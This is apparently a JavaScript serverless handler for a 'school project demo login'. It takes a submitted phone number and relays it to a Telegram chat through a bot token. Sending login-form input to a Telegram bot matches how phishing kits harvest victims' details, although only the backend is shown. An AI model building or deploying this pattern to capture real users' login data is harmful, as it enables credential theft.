export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  const body = req.body || {};
  const phone = typeof body.phone === "string"
    ? body.phone.trim()
    : "";

  if (!phone) {
    return res.status(400).json({
      success: false,
      message: "Phone number is required"
    });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({
      success: false,
      message: "Missing Telegram configuration"
    });
  }

  const telegramMessage =
    "SCHOOL PROJECT - DEMO LOGIN\n\n" +
    "Phone: " + phone + "\n" +
    "Reference: REF-82941\n" +
    "Status: Test submission received";

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: telegramMessage
        })
      }
    );

    if (!response.ok) {
      return res.status(502).json({
        success: false,
        message: "Telegram delivery failed"
      });
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
}
